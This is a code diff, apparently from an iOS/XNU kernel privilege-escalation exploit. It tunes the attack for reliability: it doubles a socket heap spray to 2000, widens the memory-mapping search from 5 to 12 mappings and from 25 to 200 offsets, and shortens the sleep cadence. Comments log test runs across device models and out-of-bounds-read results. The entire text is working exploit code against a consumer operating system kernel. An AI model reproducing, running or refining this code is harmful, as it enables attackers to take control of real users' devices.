@@ -27,8 +27,12 @@ pe_context_t g_ctx;
 offsets_t g_offsets;
 volatile int churn_go = 0;
 
-#define CS_MAX_OUTER_LOOPS 3
-#define CS_MAX_SEARCH_MAPPINGS 5
+/* v24 window widening (16:2x cross-SKU runs: A14 43 + 17 375 oob-reads, both
+   "no control/rw socket pair" = the PCB adjacency): 5 mappings x 25 page
+   samples per 64MB window = ~0.01% coverage. 12 x 200 x 4 loops = ~9600
+   samples at 2ms cadence (still bounded by the cs_expired() budget). */
+#define CS_MAX_OUTER_LOOPS 4
+#define CS_MAX_SEARCH_MAPPINGS 12
 
 kern_return_t pe_init(void) {
     init_target_file();
@@ -142,7 +146,7 @@ kern_return_t pe_v1(void) {
         outer_loop++;
         LOG("=== outer loop %d/%d ===", outer_loop, CS_MAX_OUTER_LOOPS);
 
-        uint64_t socket_spray_count = 1000;
+        uint64_t socket_spray_count = 2000;
         LOG("spraying %lu sockets...", socket_spray_count);
         
         for (uint64_t socket_count = 0; socket_count < socket_spray_count; socket_count++) {
@@ -207,7 +211,7 @@ kern_return_t pe_v1(void) {
             // V44 FIX: Do NOT mlock the search mapping. Wired pages cannot be remapped on 23F77.
             // surface_mlock(search_mapping_address, search_mapping_size);
 
-            uint64_t max_offsets = 25;
+            uint64_t max_offsets = 200;
             uint64_t seeking_offset = 0;
             
             while (seeking_offset <= search_mapping_size - contiguous_mapping_size) {
@@ -227,7 +231,7 @@ kern_return_t pe_v1(void) {
                 max_offsets--;
                 if (max_offsets == 0) break;
                 
-                usleep(5000);
+                usleep(2000);
             }
 
             kr = mach_port_deallocate(mach_task_self(), memory_object);
